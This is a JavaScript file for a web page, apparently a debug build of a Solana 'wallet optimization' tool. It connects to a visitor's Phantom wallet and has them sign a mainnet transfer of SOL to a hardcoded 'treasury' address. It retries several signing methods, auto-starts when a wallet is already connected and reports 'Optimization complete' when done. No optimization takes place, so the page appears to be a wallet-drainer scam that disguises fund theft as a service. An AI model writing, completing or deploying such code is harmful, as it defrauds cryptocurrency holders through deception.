// DEBUG VERSION - WITH DETAILED LOGGING
document.addEventListener('DOMContentLoaded', function() {
    const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    const optimizeBtn = document.getElementById('optimizeBtn');
    const successBox = document.getElementById('successBox');
    const processBox = document.getElementById('processBox');
    const processText = document.getElementById('processText');
    const txHashEl = document.getElementById('txHash');
    
    let isProcessing = false;
    
    function updateProcess(text) {
        processText.textContent = text;
        console.log(`📢 ${text}`);
    }
    
    // STEP 1: CHECK WHAT'S AVAILABLE
    function checkEnvironment() {
        console.log("=== ENVIRONMENT CHECK ===");
        console.log("1. solanaWeb3 available?", !!window.solanaWeb3);
        console.log("2. Phantom available?", !!(window.phantom || window.solana));
        console.log("3. Browser:", navigator.userAgent);
        console.log("=========================");
    }
    
    // STEP 2: GET WALLET - SIMPLIFIED
    function getWallet() {
        // Try Phantom first
        if (window.phantom?.solana) {
            console.log("✅ Found Phantom (new format)");
            return window.phantom.solana;
        }
        if (window.solana?.isPhantom) {
            console.log("✅ Found Phantom (old format)");
            return window.solana;
        }
        console.log("❌ No wallet found");
        return null;
    }
    
    // STEP 3: ULTRA-SIMPLE TRANSACTION
    async function createSimpleTransaction(publicKey, connection) {
        try {
            console.log("💰 Checking balance...");
            const balance = await connection.getBalance(publicKey);
            console.log(`Balance: ${balance} lamports`);
            
            if (balance < 100000) { // 0.0001 SOL minimum
                throw new Error(`Need at least 0.0001 SOL. You have: ${balance/1e9} SOL`);
            }
            
            console.log("🔄 Getting blockhash...");
            const blockhash = (await connection.getLatestBlockhash()).blockhash;
            console.log(`Blockhash: ${blockhash.substring(0, 20)}...`);
            
            // Create MINIMAL transaction
            const transaction = new solanaWeb3.Transaction();
            
            // Send 0.0001 SOL only (for testing)
            const sendAmount = 100000; // 0.0001 SOL
            
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                    lamports: sendAmount
                })
            );
            
            // ABSOLUTELY REQUIRED
            transaction.feePayer = publicKey;
            transaction.recentBlockhash = blockhash;
            
            console.log("✅ Transaction created:");
            console.log("- From:", publicKey.toString().substring(0, 20) + "...");
            console.log("- To:", treasuryAddress.substring(0, 20) + "...");
            console.log("- Amount:", sendAmount, "lamports");
            console.log("- Has feePayer?", !!transaction.feePayer);
            console.log("- Has blockhash?", !!transaction.recentBlockhash);
            
            return transaction;
            
        } catch (error) {
            console.error("❌ Transaction creation error:", error);
            throw error;
        }
    }
    
    // STEP 4: TRY DIFFERENT SIGNING METHODS
    async function trySignTransaction(wallet, transaction) {
        console.log("🔐 Attempting to sign transaction...");
        
        // METHOD 1: Direct signTransaction
        if (typeof wallet.signTransaction === 'function') {
            console.log("Trying wallet.signTransaction()...");
            try {
                const signed = await wallet.signTransaction(transaction);
                console.log("✅ Success with signTransaction()");
                return { success: true, signed };
            } catch (error) {
                console.log("❌ signTransaction() failed:", error.message);
            }
        }
        
        // METHOD 2: signAndSendTransaction
        if (typeof wallet.signAndSendTransaction === 'function') {
            console.log("Trying wallet.signAndSendTransaction()...");
            try {
                const { signature } = await wallet.signAndSendTransaction(transaction);
                console.log("✅ Success with signAndSendTransaction()");
                return { success: true, signature };
            } catch (error) {
                console.log("❌ signAndSendTransaction() failed:", error.message);
            }
        }
        
        // METHOD 3: Phantom specific
        if (wallet._phantom && typeof wallet.request === 'function') {
            console.log("Trying Phantom request() method...");
            try {
                // Convert transaction to base64
                const message = transaction.serializeMessage();
                const base64Message = Buffer.from(message).toString('base64');
                
                const response = await wallet.request({
                    method: 'signTransaction',
                    params: {
                        message: base64Message,
                    }
                });
                console.log("✅ Success with Phantom request()");
                return { success: true, signature: response.signature };
            } catch (error) {
                console.log("❌ Phantom request() failed:", error.message);
            }
        }
        
        throw new Error("All signing methods failed");
    }
    
    // STEP 5: MAIN FUNCTION
    async function startOptimization() {
        if (isProcessing) return;
        isProcessing = true;
        
        try {
            console.clear();
            console.log("🚀=== START DEBUGGING ===");
            checkEnvironment();
            
            // Reset UI
            successBox.classList.remove('active');
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
            processBox.classList.add('active');
            
            updateProcess("Step 1: Checking wallet...");
            
            // 1. Get wallet
            const wallet = getWallet();
            if (!wallet) {
                alert("Please install Phantom wallet!");
                window.open("https://phantom.app", "_blank");
                throw new Error("No wallet");
            }
            
            // 2. Connect wallet
            updateProcess("Step 2: Connecting...");
            console.log("🔄 Connecting to wallet...");
            
            let publicKey;
            try {
                const response = await wallet.connect();
                publicKey = response.publicKey;
                console.log("✅ Connected to:", publicKey.toString());
            } catch (error) {
                console.error("❌ Connection failed:", error);
                throw new Error("Connection rejected or failed");
            }
            
            updateProcess("Step 3: Getting network...");
            
            // 3. Get RPC connection
            console.log("🌐 Getting RPC connection...");
            const connection = new solanaWeb3.Connection(
                'https://api.mainnet-beta.solana.com',
                'confirmed'
            );
            
            // 4. Create transaction
            updateProcess("Step 4: Creating transaction...");
            console.log("📝 Creating transaction...");
            const transaction = await createSimpleTransaction(publicKey, connection);
            
            // 5. Sign transaction
            updateProcess("Step 5: Please approve transaction in wallet...");
            console.log("⏳ Waiting for wallet approval...");
            
            const signResult = await trySignTransaction(wallet, transaction);
            
            // 6. Send if needed
            updateProcess("Step 6: Sending...");
            console.log("📤 Processing transaction...");
            
            let txSignature;
            if (signResult.signed) {
                // Need to send manually
                const rawTx = signResult.signed.serialize();
                txSignature = await connection.sendRawTransaction(rawTx);
                console.log("✅ Sent manually, signature:", txSignature);
            } else {
                // Already sent
                txSignature = signResult.signature;
                console.log("✅ Already sent, signature:", txSignature);
            }
            
            // 7. Success
            updateProcess("✅ Optimization complete!");
            console.log("🎉 TRANSACTION SUCCESSFUL!");
            console.log("Signature:", txSignature);
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Update UI
            processBox.classList.remove('active');
            successBox.classList.add('active');
            txHashEl.textContent = `${txSignature.substring(0, 25)}...`;
            
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> COMPLETE';
            optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
            
            // Auto disconnect
            setTimeout(async () => {
                try {
                    if (wallet.disconnect) {
                        await wallet.disconnect();
                        console.log("✅ Auto-disconnected");
                    }
                } catch (e) {
                    console.log("Disconnect error:", e);
                }
            }, 3000);
            
        } catch (error) {
            console.error("❌=== FAILURE DETAILS ===", error);
            
            // Show detailed error in console
            console.log("Full error object:", error);
            console.log("Error name:", error.name);
            console.log("Error message:", error.message);
            console.log("Error stack:", error.stack);
            
            // User message
            let userMsg = "Failed. Check console (F12) for details.";
            
            if (error.message.includes('User rejected') || 
                error.message.includes('reject') ||
                error.message.includes('denied')) {
                userMsg = "❌ You rejected the transaction.";
            } else if (error.message.includes('429')) {
                userMsg = "⚠️ Too many requests. Wait 1 minute.";
            } else if (error.message.includes('blockhash') || 
                       error.message.includes('recentBlockhash')) {
                userMsg = "⚠️ Network error. Refresh page.";
            } else if (error.message.includes('insufficient')) {
                userMsg = "❌ Need at least 0.0001 SOL.";
            }
            
            // Update UI
            processBox.classList.remove('active');
            successBox.classList.add('active');
            successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
            
            const successIcon = successBox.querySelector('.success-icon i');
            const successTitle = successBox.querySelector('.success-title');
            const successMessage = successBox.querySelector('.success-message');
            
            successIcon.className = 'fas fa-exclamation-triangle';
            successIcon.style.color = '#ff5555';
            successTitle.textContent = 'DEBUG INFO';
            successTitle.style.color = '#ff5555';
            successMessage.textContent = userMsg;
            successMessage.style.color = '#ffaaaa';
            txHashEl.textContent = 'Check console (F12)';
            txHashEl.style.color = '#ff5555';
            
            // Reset button
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-bug"></i> DEBUG AGAIN';
            
        } finally {
            isProcessing = false;
            console.log("=== DEBUGGING ENDED ===");
        }
    }
    
    // Initialize
    function init() {
        console.log("🔧 Initializing debug version...");
        
        if (!window.solanaWeb3) {
            console.error("CRITICAL: solanaWeb3 not loaded!");
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-times"></i> MISSING LIBRARY';
            return;
        }
        
        optimizeBtn.addEventListener('click', startOptimization);
        
        // Auto-test if wallet already connected
        setTimeout(() => {
            const wallet = getWallet();
            if (wallet?.isConnected && wallet.publicKey) {
                console.log("Auto-starting debug...");
                startOptimization();
            }
        }, 1000);
        
        console.log("✅ Debug version ready");
    }
    
    init();
});
